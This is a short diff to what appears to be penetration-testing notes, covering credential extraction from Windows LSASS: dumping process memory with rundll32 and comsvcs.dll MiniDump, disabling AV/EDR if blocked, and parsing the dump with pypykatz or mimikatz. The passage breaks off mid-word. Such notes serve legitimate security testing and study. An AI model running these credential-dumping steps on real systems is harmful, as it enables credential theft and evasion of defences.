@@ -68,6 +68,11 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsassPID> <abspath_desired> 
 #Note: If blocked, try disable AV / EDR
 ```
 
--Extracting information from Kali
+-Extracting information from LSASS dump
 
-If we are able to transfer the file back to kali
+If we are able to transfer the file back to kali, we can use pypykatz to extract info:
+```
+pypykatz lsa minidump <path_to_dump>
+```
+
+If such is not available, we can deploy mimikatz onto our target and extract info at the targe
